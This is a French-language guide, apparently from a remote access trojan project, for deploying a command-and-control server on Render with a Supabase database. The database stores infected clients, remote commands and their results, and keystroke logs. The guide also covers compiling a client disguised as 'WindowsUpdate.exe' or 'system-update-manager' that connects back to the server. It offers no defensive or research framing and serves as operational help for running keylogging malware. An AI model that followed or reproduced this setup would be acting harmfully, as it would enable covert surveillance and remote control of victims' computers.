# Guide de Déploiement: Render + Supabase

Ce guide explique comment déployer votre serveur C2 sur **Render** avec une base de données **Supabase** (PostgreSQL).

---

## 📋 Prérequis

- Compte GitHub (pour déployer le code)
- Compte Render (gratuit) : https://render.com
- Compte Supabase (gratuit) : https://supabase.com

---

## 🗄️ Étape 1: Configuration de Supabase

### 1.1 Créer un projet Supabase

1. Connectez-vous à https://supabase.com
2. Cliquez sur **"New Project"**
3. Remplissez les informations:
   - **Name**: `rat-c2-database` (ou autre nom)
   - **Database Password**: Choisissez un mot de passe fort (notez-le!)
   - **Region**: Choisissez la région la plus proche
4. Cliquez sur **"Create new project"**
5. Attendez 1-2 minutes que le projet soit créé

### 1.2 Initialiser la base de données

1. Dans votre projet Supabase, allez dans **SQL Editor** (menu de gauche)
2. Cliquez sur **"New Query"**
3. Copiez tout le contenu du fichier `schema.sql` dans l'éditeur
4. Cliquez sur **"Run"** pour exécuter le script
5. Vérifiez que les tables sont créées: **Database** → **Tables**
   - Vous devriez voir: `clients`, `commands`, `command_results`, `keylogs`

### 1.3 Récupérer l'URL de connexion

1. Allez dans **Project Settings** (icône engrenage en bas à gauche)
2. Cliquez sur **"Database"** dans le menu
3. Faites défiler jusqu'à **"Connection string"**
4. Sélectionnez **"URI"** dans le dropdown
5. Copiez l'URL (elle ressemble à):
   ```
   postgresql://postgres.xxxxxxxxxxxx:[YOUR-PASSWORD]@aws-0-us-east-1.pooler.supabase.com:6543/postgres
   ```
6. **IMPORTANT**: Remplacez `[YOUR-PASSWORD]` par le mot de passe que vous avez choisi à l'étape 1.1

---

## 🚀 Étape 2: Déploiement sur Render

### 2.1 Préparer votre code

1. Poussez votre code sur GitHub:
   ```bash
   git init
   git add .
   git commit -m "Initial commit with Supabase integration"
   git branch -M main
   git remote add origin https://github.com/VOTRE_USERNAME/VOTRE_REPO.git
   git push -u origin main
   ```

### 2.2 Créer un Web Service sur Render

1. Connectez-vous à https://render.com
2. Cliquez sur **"New +"** → **"Web Service"**
3. Connectez votre dépôt GitHub
4. Configurez le service:

   **Basic Settings:**
   - **Name**: `rat-c2-server` (ou autre nom)
   - **Region**: Choisissez la même région que Supabase si possible
   - **Branch**: `main`
   - **Root Directory**: laissez vide (ou le chemin vers votre dossier)
   - **Runtime**: `Python 3`
   - **Build Command**: 
     ```bash
     pip install -r requirements.txt
     ```
   - **Start Command**:
     ```bash
     gunicorn server:app
     ```

   **Instance Type:**
   - Sélectionnez **"Free"** (suffisant pour commencer)

### 2.3 Configurer les variables d'environnement

Dans la section **"Environment Variables"**, ajoutez:

| Key | Value |
|-----|-------|
| `DATABASE_URL` | Votre URL de connexion Supabase copiée à l'étape 1.3 |
| `USE_DATABASE` | `true` |
| `ENCRYPTION_KEY` | `vErY_SeCrEt_KeY.57976461314853` (ou changez-le) |
| `PYTHON_VERSION` | `3.11.0` |

**⚠️ IMPORTANT:** 
- Gardez `DATABASE_URL` et `ENCRYPTION_KEY` secrets!
- Ne partagez jamais ces valeurs publiquement

### 2.4 Déployer

1. Cliquez sur **"Create Web Service"**
2. Render va automatiquement:
   - Cloner votre repo
   - Installer les dépendances
   - Démarrer le serveur
3. Attendez 2-5 minutes
4. Votre serveur sera accessible à: `https://VOTRE_SERVICE.onrender.com`

---

## ✅ Étape 3: Vérification

### 3.1 Tester le serveur

Ouvrez dans votre navigateur:
```
https://VOTRE_SERVICE.onrender.com/admin/status
```

Vous devriez voir une réponse JSON comme:
```json
{
  "status": "online",
  "using_database": true,
  "database_type": "PostgreSQL/Supabase",
  "total_clients": 0,
  "online_clients": 0
}
```

### 3.2 Vérifier la connexion à la base de données

Dans les logs Render, vous devriez voir:
```
[DB] Connected to PostgreSQL database
[DB] Tables initialized successfully
[SERVER] Using PostgreSQL/Supabase database
```

### 3.3 Tester avec un client

1. Modifiez `config.py` dans votre client:
   ```python
   HOST = "https://VOTRE_SERVICE.onrender.com/"
   ```

2. Compilez et exécutez le client:
   ```bash
   python compile.py
   ./dist/WindowsUpdate.exe  # Windows
   # ou
   ./dist/system-update-manager  # Linux
   ```

3. Vérifiez dans Supabase → **Table Editor** → **clients**
   - Vous devriez voir votre client enregistré!

---

## 🔧 Configuration Avancée

### Activer le mode "Always On" (optionnel, payant)

Le plan gratuit de Render met en veille votre service après 15 minutes d'inactivité.

**Solutions:**
1. **Payant**: Upgrade vers le plan payant ($7/mois) pour "Always On"
2. **Gratuit**: Utilisez un service de ping (https://uptimerobot.com) pour garder le serveur actif

### Monitoring et Logs

1. **Logs Render**: Dashboard → Votre service → **Logs**
2. **Logs Supabase**: Project → **Logs** → **Postgres Logs**
3. **Métriques**: Dashboard Render montre l'utilisation CPU/RAM

### Sécurité

1. **Changez la clé de chiffrement** dans les variables d'environnement
2. **Activez l'authentification** pour les routes `/admin/*` (recommandé)
3. **Utilisez HTTPS** (automatique avec Render)
4. **Limitez l'accès à Supabase** via les Row Level Security policies

---

## 🐛 Dépannage

### Erreur: "Database connection failed"

- Vérifiez que `DATABASE_URL` est correctement configuré
- Vérifiez que le mot de passe dans l'URL est correct
- Vérifiez que Supabase est bien démarré

### Erreur: "ModuleNotFoundError: No module named 'psycopg2'"

- Assurez-vous que `requirements.txt` contient `psycopg2-binary==2.9.9`
- Redéployez le service

### Le client ne se connecte pas

1. Vérifiez l'URL dans `config.py` du client
2. Vérifiez que le serveur est bien démarré (logs Render)
3. Vérifiez les logs du serveur pour voir les requêtes

### Données perdues après redémarrage

- Vérifiez que `USE_DATABASE=true` dans les variables d'environnement
- Vérifiez les logs: devrait afficher "Using PostgreSQL/Supabase database"

---

## 📊 Maintenance

### Nettoyer les anciennes données

Les fonctions de nettoyage automatique s'exécutent automatiquement:
- Clients inactifs > 1 heure: supprimés toutes les 30 secondes
- Keylogs > 24 heures: supprimés toutes les heures

Vous pouvez aussi exécuter manuellement dans Supabase SQL Editor:
```sql
-- Nettoyer les clients inactifs (plus de 2 heures)
SELECT cleanup_inactive_clients(2);

-- Nettoyer les keylogs (plus de 48 heures)
SELECT cleanup_old_keylogs(48);
```

### Sauvegarder la base de données

1. Supabase → **Database** → **Backups**
2. Téléchargez un backup manuel si nécessaire

---

## 💰 Coûts

### Gratuit (limites):
- **Render Free Tier**: 750 heures/mois, se met en veille après 15 min
- **Supabase Free Tier**: 500 MB de base de données, 2 GB de bande passante

### Payant:
- **Render**: $7/mois pour "Always On"
- **Supabase**: $25/mois pour Pro (8 GB DB, pas de limite de bande passante)

---

## ✨ Fonctionnalités de la Base de Données

- ✅ **Persistance des données** (survivent aux redémarrages)
- ✅ **Stockage des clients** avec historique complet
- ✅ **Stockage des commandes** et résultats
- ✅ **Stockage des keylogs** avec métadonnées
- ✅ **Nettoyage automatique** des données anciennes
- ✅ **Indexation optimisée** pour les performances
- ✅ **Vues SQL** pour les statistiques
- ✅ **Fallback automatique** vers stockage en mémoire si DB échoue

---

## 📞 Support

- **Render Docs**: https://render.com/docs
- **Supabase Docs**: https://supabase.com/docs
- **PostgreSQL Docs**: https://www.postgresql.org/docs/

---

**🎉 Félicitations! Votre serveur C2 est maintenant déployé sur Render avec Supabase!**
